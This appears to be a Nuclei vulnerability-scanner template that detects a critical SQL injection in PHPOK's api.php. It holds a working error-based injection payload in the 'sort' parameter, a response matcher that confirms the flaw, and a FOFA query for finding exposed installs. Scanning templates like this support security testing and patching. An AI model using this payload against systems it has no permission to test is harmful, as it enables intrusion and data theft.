id: phpok-sqli
info:
  name: PHPOK - SQL Injection
  author: ritikchaddha
  severity: critical
  description: PHPOK is vulnerable to SQL injection through a GET request, allowing
    an attacker to potentially access sensitive data, alter data, and carry out unauthorized
    administrative functions on the affected site.
  reference:
  - https://cve.report/software/phpok/phpok
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    fofa-query: app="phpok"
    impact: The SQL injection vulnerability in PHPOK can result in the unauthorized
      access, modification, and administration of sensitive data by an attacker through
      a GET request.
    recommendation: It is recommended to update PHPOK to a version that has patched
      the SQL injection vulnerability.
  tags: phpok,sqli
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}})))
    --+'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '{{md5({{num}})}}'
